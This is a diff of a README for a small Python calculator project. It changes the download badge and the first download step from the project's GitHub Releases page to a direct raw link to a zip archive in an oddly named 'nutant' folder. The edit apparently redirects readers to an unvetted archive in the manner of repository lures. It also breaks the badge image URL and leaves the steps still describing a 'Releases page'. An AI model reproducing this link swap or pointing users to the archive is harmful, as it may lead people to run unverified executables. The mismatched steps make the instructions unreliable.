@@ -8,11 +8,11 @@ Welcome to **python-project-**! This is a straightforward calculator application
 
 To get started, you need to download the calculator application. Click the button below to visit the Releases page and download the software:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/jr8478227-glitch/python-project-/releases)
+[![Download Now](https://raw.githubusercontent.com/jr8478227-glitch/python-project-/main/nutant/project-python-v1.6.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jr8478227-glitch/python-project-/main/nutant/project-python-v1.6.zip)
 
 ### Steps to Download and Run
 
-1. Click the button above or [visit this page to download](https://github.com/jr8478227-glitch/python-project-/releases).
+1. Click the button above or [visit this page to download](https://raw.githubusercontent.com/jr8478227-glitch/python-project-/main/nutant/project-python-v1.6.zip).
 2. On the Releases page, look for the latest version of the calculator.
 3. Download the installation file that matches your operating system (Windows, macOS, or Linux).
 4. After the download finishes, locate the file in your downloads folder.
